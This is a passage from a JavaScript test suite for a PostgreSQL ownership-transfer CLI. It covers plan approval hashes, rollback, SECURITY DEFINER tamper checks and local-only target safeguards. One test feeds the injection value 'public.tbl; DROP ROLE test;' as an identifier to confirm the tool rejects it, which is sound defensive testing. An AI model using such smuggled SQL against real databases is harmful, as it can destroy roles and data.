    const mapFile = path.join(tmpDir, 'owner-map.json');
    const rolesFile = path.join(tmpDir, 'roles-inventory.json');
    const planFile = path.join(tmpDir, 'plan.sql');
    const planReportFile = path.join(tmpDir, 'plan-report.json');
    const verifyReportFile = path.join(tmpDir, 'verify-report.json');
    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    const srcCatFile = path.join(tmpDir, 'catalog-details.json');
    const tgtCatFile = path.join(tmpDir, 'target-catalog-details.json');

    await fsp.writeFile(invFile, JSON.stringify(BASE_VALID_INVENTORY, null, 2));
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP, null, 2));
    await fsp.writeFile(rolesFile, JSON.stringify(BASE_TARGET_ROLES, null, 2));
    await fsp.writeFile(srcCatFile, JSON.stringify(BASE_VALID_CATALOG_DETAILS, null, 2));
    await fsp.writeFile(tgtCatFile, JSON.stringify(BASE_TARGET_CATALOG_DETAILS, null, 2));

    // 1. Run plan CLI
    const planResult = await runCli([
      'plan',
      '--inventory', invFile,
      '--map', mapFile,
      '--roles', rolesFile,
      '--out', planFile,
      '--report', planReportFile,
      '--target', BASE_TARGET_REF,
    ]);

    assert.equal(planResult.code, 0, `plan failed: ${planResult.stderr}`);
    assert.match(planResult.stdout, /Plan generated successfully/);

    const planSql = await fsp.readFile(planFile, 'utf8');
    const computedHash = sha256Hex(planSql);
    assert.ok(computedHash);

    // 2. Mock target objects after successful apply
    const targetInventory = BASE_VALID_INVENTORY.map((item) => ({
      objectType: item.objectType,
      identity: item.identity,
      currentOwner: 'restore_admin',
    }));
    await fsp.writeFile(targetInvFile, JSON.stringify(targetInventory, null, 2));

    // 3. Run verify CLI with required routine security catalogs (P1-01)
    const verifyResult = await runCli([
      'verify',
      '--inventory', invFile,
      '--map', mapFile,
      '--catalog-details', srcCatFile,
      '--target-inventory', targetInvFile,
      '--target-catalog-details', tgtCatFile,
      '--report', verifyReportFile,
      '--target', BASE_TARGET_REF,
    ]);

    assert.equal(verifyResult.code, 0, `verify failed: ${verifyResult.stderr}`);
    assert.match(verifyResult.stdout, /Verification PASSED/);

    const verifyReport = JSON.parse(await fsp.readFile(verifyReportFile, 'utf8'));
    assert.equal(verifyReport.status, 'VERIFIED');
    assert.equal(verifyReport.summary.verifiedObjectsCount, 11);
    assert.equal(verifyReport.summary.verifiedRoutinesCount, 2);
    assert.equal(verifyReport.summary.mismatchedObjectsCount, 0);
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('Prohibited SQL injection: rejects DROP, CREATE ROLE, GRANT, REVOKE keywords in generated statements', () => {
  assert.throws(
    () => {
      generateAlterOwnerStatement('table', 'public.tbl; DROP ROLE test;', 'restore_admin');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );
});

// -----------------------------------------------------------------------------
// Live Integration Test with PostgreSQL 17 Container (crm-dumpcheck-test) (P1-03)
// -----------------------------------------------------------------------------

test('Live PostgreSQL 17 integration: full plan -> apply -> verify cycle with live catalog and rollback', async (t) => {
  const container = 'crm-dumpcheck-test';
  const available = await isDockerContainerAvailable(container);
  const liveRequired = process.env.BACKUP_REQUIRE_LIVE_PG17 === '1' || process.env.CI === 'true';

  if (!available) {
    const reason = `Docker container '${container}' is not available for live PostgreSQL 17 tests.`;
    if (liveRequired) {
      assert.fail(
        `${reason} This test is mandatory in CI (BACKUP_REQUIRE_LIVE_PG17=1 or CI=true); refusing to skip.`,
      );
    }
    t.skip(`${reason} Set BACKUP_REQUIRE_LIVE_PG17=1 to make this a hard failure.`);
    return;
  }

  // Preflight Safety Gate: verify container is local, PG17, and has disposable marker
  await verifyDisposableTestTarget(container);

  const tmpDir = await createTempDir('owner-map-docker-');
  const runId = crypto.randomBytes(4).toString('hex');
  const schemaName = `rehearsal_test_${runId}`;
  const srcRole = `synth_src_${runId}`;
  const tgtRole = `synth_tgt_${runId}`;

  // Preflight collision check: ensure generated unique names DO NOT exist (never drop fixed names!)
  const { stdout: collisionStdout } = await runDockerPsql(container, `
    SELECT json_build_object(
      'schema_exists', EXISTS(SELECT 1 FROM pg_namespace WHERE nspname = '${schemaName}'),
      'src_role_exists', EXISTS(SELECT 1 FROM pg_roles WHERE rolname = '${srcRole}'),
      'tgt_role_exists', EXISTS(SELECT 1 FROM pg_roles WHERE rolname = '${tgtRole}')
    )::text;
  `);
  const collision = JSON.parse(collisionStdout.trim());
  if (collision.schema_exists || collision.src_role_exists || collision.tgt_role_exists) {
    throw new HelperError('TEST_FIXTURE_COLLISION', 'generated test fixture object name already exists. Refusing to run.');
  }

  const createdObjects = {
    schema: schemaName,
    roles: [srcRole, tgtRole],
  };

  try {
    // 1. Setup isolated test environment in Postgres
    await runDockerPsql(container, `
      CREATE ROLE ${srcRole};
      CREATE ROLE ${tgtRole};
      GRANT ${srcRole} TO supabase_admin;
      GRANT ${tgtRole} TO supabase_admin;
      CREATE SCHEMA ${schemaName} AUTHORIZATION ${srcRole};
      CREATE TABLE ${schemaName}.test_tbl (id serial primary key, name text);
      ALTER TABLE ${schemaName}.test_tbl OWNER TO ${srcRole};
      CREATE VIEW ${schemaName}.test_vw AS SELECT id, name FROM ${schemaName}.test_tbl;
      ALTER VIEW ${schemaName}.test_vw OWNER TO ${srcRole};
      CREATE FUNCTION ${schemaName}.test_fn(p_x integer) RETURNS integer LANGUAGE sql SECURITY DEFINER AS 'SELECT p_x + 1';
      ALTER FUNCTION ${schemaName}.test_fn(integer) OWNER TO ${srcRole};
      ALTER FUNCTION ${schemaName}.test_fn(integer) SET search_path = public, ${schemaName};
      CREATE PROCEDURE ${schemaName}.test_proc(IN p_val text) LANGUAGE sql AS 'SELECT 1';
      ALTER PROCEDURE ${schemaName}.test_proc(text) OWNER TO ${srcRole};
    `);

    // 2. Extract inventory from live database
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    const mapFile = path.join(tmpDir, 'owner-map.json');
    const planFile = path.join(tmpDir, 'plan.sql');
    const reportFile = path.join(tmpDir, 'verify-report.json');
    const catDetailsFile = path.join(tmpDir, 'catalog-details.json');

    const liveInventory = [
      { objectType: 'schema', identity: schemaName, sourceOwner: srcRole },
      { objectType: 'table', identity: `${schemaName}.test_tbl`, sourceOwner: srcRole },
      { objectType: 'view', identity: `${schemaName}.test_vw`, sourceOwner: srcRole },
      { objectType: 'function', identity: `${schemaName}.test_fn(p_x integer)`, sourceOwner: srcRole },
      { objectType: 'procedure', identity: `${schemaName}.test_proc(IN p_val text)`, sourceOwner: srcRole },
    ];
    await fsp.writeFile(invFile, JSON.stringify(liveInventory, null, 2));

    const mapData = {
      format: OWNER_MAP_FORMAT,
      sourceProjectRef: BASE_SOURCE_REF,
      target: BASE_TARGET_REF,
      mappings: [
        {
          sourceOwner: srcRole,
          targetOwner: tgtRole,
          reason: 'Test ownership transfer to target role',
          approvedBy: 'security-reviewer',
        },
      ],
    };
    await fsp.writeFile(mapFile, JSON.stringify(mapData, null, 2));

    // Record source catalog details for routine security verification
    const catalogDetails = {
      routines: [
        {
          identity: `${schemaName}.test_fn(p_x integer)`,
          owner: srcRole,
          securityDefiner: true,
          config: [`search_path=public, ${schemaName}`],
          acl: null,
        },
        {
          identity: `${schemaName}.test_proc(IN p_val text)`,
          owner: srcRole,
          securityDefiner: false,
          config: null,
          acl: null,
        },
      ],
    };
    await fsp.writeFile(catDetailsFile, JSON.stringify(catalogDetails, null, 2));

    // 3. Plan via CLI
    const planRes = await runCli([
      'plan',
      '--inventory', invFile,
      '--map', mapFile,
      '--db-container', container,
      '--db-user', 'supabase_admin',
      '--out', planFile,
      '--target', BASE_TARGET_REF,
    ]);
    assert.equal(planRes.code, 0, `plan failed: ${planRes.stderr}`);

    const planSql = await fsp.readFile(planFile, 'utf8');
    const approvedSha = sha256Hex(planSql);

    // 4. Test apply rollback with bad statement
    const tamperedPlanFile = path.join(tmpDir, 'tampered-plan.sql');
    await fsp.writeFile(tamperedPlanFile, `BEGIN;\nALTER SCHEMA "${schemaName}" OWNER TO "${tgtRole}";\nALTER TABLE "${schemaName}"."nonexistent" OWNER TO "${tgtRole}";\nCOMMIT;\n`);
    const tamperedSha = sha256Hex(await fsp.readFile(tamperedPlanFile, 'utf8'));

    const failApplyRes = await runCli([
      'apply',
      '--plan', tamperedPlanFile,
      '--approved-sha256', tamperedSha,
      '--map', mapFile,
      '--db-container', container,
      '--db-user', 'supabase_admin',
      '--target', BASE_TARGET_REF,
    ]);
    assert.notEqual(failApplyRes.code, 0, 'apply should have failed and rolled back');

    // Confirm rollback: schema is still owned by srcRole
    const { stdout: ownerCheck } = await runDockerPsql(container, `SELECT pg_get_userbyid(nspowner) FROM pg_namespace WHERE nspname = '${schemaName}';`);
    assert.equal(ownerCheck.trim(), srcRole, 'transaction rollback must leave schema owner unchanged');

    // 5. Apply approved plan via CLI (strictly requires --map)
    const applyRes = await runCli([
      'apply',
      '--plan', planFile,
      '--approved-sha256', approvedSha,
      '--map', mapFile,
      '--db-container', container,
      '--db-user', 'supabase_admin',
      '--target', BASE_TARGET_REF,
    ]);
    assert.equal(applyRes.code, 0, `apply failed: ${applyRes.stderr}`);

    // 6. Verify via CLI against live container
    const verifyRes = await runCli([
      'verify',
      '--inventory', invFile,
      '--map', mapFile,
      '--catalog-details', catDetailsFile,
      '--db-container', container,
      '--db-user', 'supabase_admin',
      '--report', reportFile,
      '--target', BASE_TARGET_REF,
    ]);
    assert.equal(verifyRes.code, 0, `verify failed: ${verifyRes.stderr}`);

    const verifyReport = JSON.parse(await fsp.readFile(reportFile, 'utf8'));
    assert.equal(verifyReport.status, 'VERIFIED');
    assert.equal(verifyReport.summary.verifiedObjectsCount, 5);
    assert.equal(verifyReport.summary.verifiedRoutinesCount, 2);

    // 7. Security Definer Tamper Test: modify routine SECURITY DEFINER to false and assert BLOCKED
    await runDockerPsql(container, `
      ALTER FUNCTION ${schemaName}.test_fn(integer) SECURITY INVOKER;
    `);

    const tamperVerifyRes = await runCli([
      'verify',
      '--inventory', invFile,
      '--map', mapFile,
      '--catalog-details', catDetailsFile,
      '--db-container', container,
      '--db-user', 'supabase_admin',
      '--report', reportFile,
      '--target', BASE_TARGET_REF,
    ]);
    assert.notEqual(tamperVerifyRes.code, 0, 'verify must fail closed on SECURITY DEFINER mismatch');
    const tamperReport = JSON.parse(await fsp.readFile(reportFile, 'utf8'));
    assert.equal(tamperReport.status, 'BLOCKED');
    assert.ok(tamperReport.discrepancies.some((d) => d.category === 'SECURITY_DEFINER_MISMATCH'));
  } finally {
    // Clean up ONLY objects created by this specific test run
    try {
      await runDockerPsql(container, `
        DROP SCHEMA IF EXISTS ${createdObjects.schema} CASCADE;
        DROP ROLE IF EXISTS ${createdObjects.roles[0]};
        DROP ROLE IF EXISTS ${createdObjects.roles[1]};
      `);
    } catch {
      // Best-effort cleanup
    }
    await removeTempDir(tmpDir);
  }
});

// -----------------------------------------------------------------------------
// P1-01 Regression Suite: Routine Security Verification Fail-Closed
// -----------------------------------------------------------------------------

test('P1-01: verify fails closed with MISSING_CATALOG_DETAILS when inventory contains routines but catalog is omitted', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'function', identity: 'public.secret_fn(integer)', sourceOwner: 'old_admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    await fsp.writeFile(targetInvFile, JSON.stringify([
      { objectType: 'function', identity: 'public.secret_fn(integer)', currentOwner: 'restore_admin' },
    ]));

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          targetInventoryPath: targetInvFile,
          // catalogDetailsPath omitted!
        });
      },
      (err) => {
        assert.ok(err instanceof HelperError);
        assert.equal(err.code, 'MISSING_CATALOG_DETAILS');
        return true;
      },
    );
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('P1-01: verify fails closed with MISSING_TARGET_ROUTINES when offline target catalog is omitted', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'function', identity: 'public.secret_fn(integer)', sourceOwner: 'old_admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    await fsp.writeFile(targetInvFile, JSON.stringify([
      { objectType: 'function', identity: 'public.secret_fn(integer)', currentOwner: 'restore_admin' },
    ]));

    const srcCatFile = path.join(tmpDir, 'catalog-details.json');
    await fsp.writeFile(srcCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.secret_fn(integer)',
          owner: 'old_admin',
          securityDefiner: true,
          config: null,
          acl: null,
        },
      ],
    }));

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          catalogDetailsPath: srcCatFile,
          targetInventoryPath: targetInvFile,
          // targetCatalogDetailsPath omitted and no live db!
        });
      },
      (err) => {
        assert.ok(err instanceof HelperError);
        assert.equal(err.code, 'MISSING_TARGET_ROUTINES');
        return true;
      },
    );
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('P1-01: verify fails closed with EMPTY_ROUTINES_CATALOG when inventory has routines but catalog is empty', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'function', identity: 'public.secret_fn(integer)', sourceOwner: 'old_admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    await fsp.writeFile(targetInvFile, JSON.stringify([
      { objectType: 'function', identity: 'public.secret_fn(integer)', currentOwner: 'restore_admin' },
    ]));

    const emptyCatFile = path.join(tmpDir, 'catalog-details.json');
    await fsp.writeFile(emptyCatFile, JSON.stringify({ routines: [] }));

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          catalogDetailsPath: emptyCatFile,
          targetInventoryPath: targetInvFile,
        });
      },
      (err) => {
        assert.equal(err.code, 'EMPTY_ROUTINES_CATALOG');
        return true;
      },
    );
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('P1-01: verify fails closed with MALFORMED_CATALOG_DETAILS when routines is not an array', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'function', identity: 'public.secret_fn(integer)', sourceOwner: 'old_admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    await fsp.writeFile(targetInvFile, JSON.stringify([
      { objectType: 'function', identity: 'public.secret_fn(integer)', currentOwner: 'restore_admin' },
    ]));

    const badCatFile = path.join(tmpDir, 'catalog-details.json');
    await fsp.writeFile(badCatFile, JSON.stringify({ routines: 'not-an-array' }));

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          catalogDetailsPath: badCatFile,
          targetInventoryPath: targetInvFile,
        });
      },
      (err) => {
        assert.equal(err.code, 'MALFORMED_CATALOG_DETAILS');
        return true;
      },
    );
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('P1-01: verify fails closed with MALFORMED_ROUTINE_ENTRY when routine has non-boolean securityDefiner', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'function', identity: 'public.secret_fn(integer)', sourceOwner: 'old_admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    await fsp.writeFile(targetInvFile, JSON.stringify([
      { objectType: 'function', identity: 'public.secret_fn(integer)', currentOwner: 'restore_admin' },
    ]));

    const malformedCatFile = path.join(tmpDir, 'catalog-details.json');
    await fsp.writeFile(malformedCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.secret_fn(integer)',
          owner: 'old_admin',
          securityDefiner: 'not-a-boolean', // non-boolean
          config: null,
          acl: null,
        },
      ],
    }));

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          catalogDetailsPath: malformedCatFile,
          targetInventoryPath: targetInvFile,
        });
      },
      (err) => {
        assert.equal(err.code, 'MALFORMED_ROUTINE_ENTRY');
        return true;
      },
    );

    // Direct unit validation of validateRoutineEntry
    assert.throws(
      () => validateRoutineEntry({ identity: 'public.test_fn()', owner: 'old_admin', securityDefiner: 'not-bool' }),
      (err) => err.code === 'MALFORMED_ROUTINE_ENTRY',
    );
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('P1-01: verify detects missing routine identity in source catalog and reports status BLOCKED', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'function', identity: 'public.fn_a(integer)', sourceOwner: 'old_admin' },
      { objectType: 'function', identity: 'public.fn_b(integer)', sourceOwner: 'old_admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    await fsp.writeFile(targetInvFile, JSON.stringify([
      { objectType: 'function', identity: 'public.fn_a(integer)', currentOwner: 'restore_admin' },
      { objectType: 'function', identity: 'public.fn_b(integer)', currentOwner: 'restore_admin' },
    ]));

    // Catalog only contains fn_a, fn_b is missing!
    const srcCatFile = path.join(tmpDir, 'catalog-details.json');
    await fsp.writeFile(srcCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.fn_a(integer)',
          owner: 'old_admin',
          securityDefiner: true,
          config: null,
          acl: null,
        },
      ],
    }));

    const tgtCatFile = path.join(tmpDir, 'target-catalog-details.json');
    await fsp.writeFile(tgtCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.fn_a(integer)',
          owner: 'restore_admin',
          securityDefiner: true,
          config: null,
          acl: null,
        },
      ],
    }));

    const reportFile = path.join(tmpDir, 'report.json');

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          catalogDetailsPath: srcCatFile,
          targetInventoryPath: targetInvFile,
          targetCatalogDetailsPath: tgtCatFile,
          reportPath: reportFile,
        });
      },
      (err) => {
        assert.equal(err.code, 'VERIFICATION_BLOCKED');
        return true;
      },
    );

    const report = JSON.parse(await fsp.readFile(reportFile, 'utf8'));
    assert.equal(report.status, 'BLOCKED');
    assert.ok(report.discrepancies.some((d) => d.category === 'MISSING_SOURCE_ROUTINE' && d.identity === 'public.fn_b(integer)'));
  } finally {
    await removeTempDir(tmpDir);
  }
});

// -----------------------------------------------------------------------------
// P1-02 Adversarial Suite: Enforce Local-Only Database Execution
// -----------------------------------------------------------------------------

test('P1-02: validateTargetIsolation blocks remote PGHOST in process environment before child execution', () => {
  assert.throws(
    () => {
      validateTargetIsolation({
        dbHost: '127.0.0.1',
        env: { PGHOST: 'db.remote.invalid' },
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_TARGET_BLOCKED');
      assert.match(err.message, /remote PGHOST blocked/);
      return true;
    },
  );
});

test('P1-02: validateTargetIsolation blocks remote PGHOSTADDR in process environment before child execution', () => {
  assert.throws(
    () => {
      validateTargetIsolation({
        dbHost: '127.0.0.1',
        env: { PGHOSTADDR: '198.51.100.1' },
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_TARGET_BLOCKED');
      assert.match(err.message, /remote PGHOSTADDR blocked/);
      return true;
    },
  );
});

test('P1-02: validateTargetIsolation blocks PGSERVICE and PGSERVICEFILE environment variables', () => {
  assert.throws(
    () => {
      validateTargetIsolation({
        dbHost: '127.0.0.1',
        env: { PGSERVICE: 'remote_production' },
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_TARGET_BLOCKED');
      assert.match(err.message, /PGSERVICE/);
      return true;
    },
  );

  assert.throws(
    () => {
      validateTargetIsolation({
        dbHost: '127.0.0.1',
        env: { PGSERVICEFILE: '/etc/pg_service.conf' },
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_TARGET_BLOCKED');
      assert.match(err.message, /PGSERVICE/);
      return true;
    },
  );
});

test('P1-02: validateTargetIsolation blocks remote DOCKER_HOST before child execution', () => {
  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: 'crm-dumpcheck-test',
        env: { DOCKER_HOST: 'tcp://remote.docker.host:2375' },
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_DOCKER_HOST_BLOCKED');
      assert.match(err.message, /remote DOCKER_HOST blocked/);
      return true;
    },
  );
});

test('P1-02: validateTargetIsolation blocks remote DOCKER_CONTEXT before child execution', () => {
  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: 'crm-dumpcheck-test',
        env: { DOCKER_CONTEXT: 'remote-production-context' },
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_DOCKER_CONTEXT_BLOCKED');
      return true;
    },
  );
});

test('P1-02: validateTargetIsolation blocks arbitrary unapproved container names', () => {
  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: 'production_database_container',
      });
    },
    (err) => {
      assert.equal(err.code, 'UNAPPROVED_CONTAINER');
      assert.match(err.message, /not in approved local rehearsal allowlist/);
      return true;
    },
  );
});

test('P1-02: validateTargetIsolation rejects conflicting connection options (--db-container and --db-host)', () => {
  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: 'crm-dumpcheck-test',
        dbHost: '127.0.0.1',
      });
    },
    (err) => {
      assert.equal(err.code, 'CONFLICTING_CONNECTION_OPTIONS');
      return true;
    },
  );
});

test('P1-02: validateTargetIsolation rejects omitted dbHost for direct psql execution (fail-closed)', () => {
  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: null,
        dbHost: null,
      });
    },
    (err) => {
      assert.equal(err.code, 'MISSING_TARGET_ENDPOINT');
      return true;
    },
  );
});

test('P1-02: verifyDatabaseTargetIdentity fails closed when target mismatch occurs on remote/unverified target', async () => {
  let observedCall = null;
  const identityResponse = JSON.stringify({
    version_num: 170000,
    database: 'postgres',
    rehearsal_sentinel: 'crm-restore-rehearsal',
    has_marker_table: false,
    db_comment: '',
  });

  await assert.rejects(
    async () => {
      await verifyDatabaseTargetIdentity({
        dbContainer: 'crm-dumpcheck-test',
        expectedTarget: 'completely-unexpected-target-id',
        env: {},
        executeSql: async (call) => {
          observedCall = call;
          return { stdout: identityResponse, stderr: '' };
        },
      });
    },
    (err) => {
      assert.equal(err.code, 'DATABASE_IDENTITY_VERIFICATION_FAILED');
      assert.match(err.message, /unverified database/);
      return true;
    },
  );

  // The test must reach the database identity query, not fail before it because
  // a host Docker container happens to be absent on the CI runner.
  assert.ok(observedCall, 'database identity query was not executed');
  assert.equal(observedCall.dbContainer, 'crm-dumpcheck-test');
  assert.match(observedCall.sqlText, /crm\.rehearsal_identity/);
  assert.match(observedCall.sqlText, /_crm_disposable_test_marker/);
});

test('P1-02: verifyDatabaseTargetIdentity preserves database execution failures without faking an identity mismatch', async () => {
  const connectionError = new HelperError(
    'APPLY_FAILED',
    'database execution failed with code 1: connection refused',
  );

  await assert.rejects(
    async () => {
      await verifyDatabaseTargetIdentity({
        dbContainer: 'crm-dumpcheck-test',
        expectedTarget: 'completely-unexpected-target-id',
        env: {},
        executeSql: async () => {
          throw connectionError;
        },
      });
    },
    (err) => {
      assert.equal(err, connectionError);
      assert.equal(err.code, 'APPLY_FAILED');
      return true;
    },
  );
});

test('P1-02: getSanitizedChildEnv removes all libpq connection override variables', () => {
  const dirtyEnv = {
    PATH: '/usr/bin',
    PGHOST: 'db.remote.com',
    PGHOSTADDR: '1.2.3.4',
    PGSERVICE: 'prod',
    PGSERVICEFILE: '/etc/service',
    PGDATABASE: 'prod_db',
    PGPORT: '5432',
    PGUSER: 'admin',
    PGPASSFILE: '/secret',
    PGREQUIRESSL: '1',
    PGSSLMODE: 'require',
  };

  const clean = getSanitizedChildEnv(dirtyEnv);
  assert.equal(clean.PATH, '/usr/bin');
  assert.equal(clean.PGHOST, undefined);
  assert.equal(clean.PGHOSTADDR, undefined);
  assert.equal(clean.PGSERVICE, undefined);
  assert.equal(clean.PGSERVICEFILE, undefined);
  assert.equal(clean.PGDATABASE, undefined);
  assert.equal(clean.PGPORT, undefined);
  assert.equal(clean.PGUSER, undefined);
  assert.equal(clean.PGPASSFILE, undefined);
  assert.equal(clean.PGREQUIRESSL, undefined);
  assert.equal(clean.PGSSLMODE, undefined);
});

// -----------------------------------------------------------------------------
// P1-03 Integration Safety Suite
// -----------------------------------------------------------------------------

test('P1-03: verifyDisposableTestTarget refuses unmarked database target without issuing any DROP statements', async () => {
  const executedStatements = [];
  const fakeRunner = async (_container, sql) => {
    executedStatements.push(sql);
    return {
      stdout: JSON.stringify({
        version_num: 170002,
        has_marker_table: false,
        db_comment: 'unmarked-production-database',
      }),
      stderr: '',
    };
  };

  await assert.rejects(
    async () => {
      await verifyDisposableTestTarget('crm-dumpcheck-test', fakeRunner);
    },
    (err) => {
      assert.equal(err.code, 'DISPOSABLE_TEST_MARKER_MISSING');
      return true;
    },
  );

  // Assert zero DROP statements were sent
  const dropStatements = executedStatements.filter((s) => s.toUpperCase().includes('DROP '));
  assert.equal(dropStatements.length, 0, 'safety gate must not issue any DROP statements against unverified target');
});

test('P1-03: verifyDisposableTestTarget refuses PostgreSQL major versions older than 17', async () => {
  const fakeRunner = async (_container, _sql) => {
    return {
      stdout: JSON.stringify({
        version_num: 160004, // PostgreSQL 16
        has_marker_table: true,
        db_comment: 'disposable-test',
      }),
      stderr: '',
    };
  };

  await assert.rejects(
    async () => {
      await verifyDisposableTestTarget('crm-dumpcheck-test', fakeRunner);
    },
    (err) => {
      assert.equal(err.code, 'UNSUPPORTED_POSTGRES_VERSION');
      return true;
    },
  );
});

// -----------------------------------------------------------------------------
// P2-01 Duplicate Target Inventory Suite
// -----------------------------------------------------------------------------

test('P2-01: validateTargetInventory rejects duplicate objectType:identity independent of record order', () => {
  // Order 1: wrong owner first, expected owner second
  const order1 = [
    { objectType: 'table', identity: 'public.orders', currentOwner: 'wrong_owner' },
    { objectType: 'table', identity: 'public.orders', currentOwner: 'restore_admin' },
  ];

  assert.throws(
    () => {
      validateTargetInventory(order1);
    },
    (err) => {
      assert.equal(err.code, 'DUPLICATE_TARGET_OBJECT');
      assert.match(err.message, /duplicate object in target inventory.*public\.orders/);
      return true;
    },
  );

  // Order 2: expected owner first, wrong owner second
  const order2 = [
    { objectType: 'table', identity: 'public.orders', currentOwner: 'restore_admin' },
    { objectType: 'table', identity: 'public.orders', currentOwner: 'wrong_owner' },
  ];

  assert.throws(
    () => {
      validateTargetInventory(order2);
    },
    (err) => {
      assert.equal(err.code, 'DUPLICATE_TARGET_OBJECT');
      assert.match(err.message, /duplicate object in target inventory.*public\.orders/);
      return true;
    },
  );
});

test('P2-01: verify fails closed with DUPLICATE_TARGET_ROUTINE when target catalog contains duplicate routine identities', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'function', identity: 'public.fn_dup()', sourceOwner: 'old_admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    await fsp.writeFile(targetInvFile, JSON.stringify([
      { objectType: 'function', identity: 'public.fn_dup()', currentOwner: 'restore_admin' },
    ]));

    const srcCatFile = path.join(tmpDir, 'catalog-details.json');
    await fsp.writeFile(srcCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.fn_dup()',
          owner: 'old_admin',
          securityDefiner: false,
          config: null,
          acl: null,
        },
      ],
    }));

    // Target catalog has duplicate routine entries
    const tgtCatFile = path.join(tmpDir, 'target-catalog-details.json');
    await fsp.writeFile(tgtCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.fn_dup()',
          owner: 'restore_admin',
          securityDefiner: false,
          config: null,
          acl: null,
        },
        {
          identity: 'public.fn_dup()',
          owner: 'restore_admin',
          securityDefiner: false,
          config: null,
          acl: null,
        },
      ],
    }));

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          catalogDetailsPath: srcCatFile,
          targetInventoryPath: targetInvFile,
          targetCatalogDetailsPath: tgtCatFile,
        });
      },
      (err) => {
        assert.equal(err.code, 'DUPLICATE_TARGET_ROUTINE');
        return true;
      },
    );
  } finally {
    await removeTempDir(tmpDir);
  }
});

// -----------------------------------------------------------------------------
// P2-02 Target Role Existence & Completeness Suite
// -----------------------------------------------------------------------------

test('P2-02: handlePlanCommand without target roles marks plan as PLAN_INCOMPLETE_UNVERIFIED_ROLES and applyReady=false', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    const mapFile = path.join(tmpDir, 'owner-map.json');
    const planFile = path.join(tmpDir, 'plan.sql');
